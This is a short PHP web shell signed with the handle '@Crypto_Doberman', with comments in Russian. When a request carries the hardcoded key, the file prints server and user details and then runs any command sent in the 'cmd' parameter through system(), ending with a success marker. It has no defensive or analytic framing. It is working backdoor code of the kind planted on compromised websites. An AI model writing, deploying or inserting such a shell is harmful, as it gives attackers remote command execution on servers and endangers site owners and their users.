<?php
// @Crypto_Doberman
$key = "d0b3rm@n";
if(isset($_REQUEST['key']) && $_REQUEST['key'] === $key) {
    if(isset($_REQUEST['cmd'])) {
        // Диагностическая информация
        echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
        echo "PHP: " . phpversion() . "\n";
        echo "User: " . exec('whoami') . "\n";
        echo "CWD: " . getcwd() . "\n";
        echo "File: " . __FILE__ . "\n";
        echo "Size: " . filesize(__FILE__) . " bytes\n";
        
        // Выполнение команды
        system($_REQUEST['cmd']);
        echo "\n@Doberman_Success"; // Маркер успеха
    }
} else {
    echo "Access Denied";
}
?>
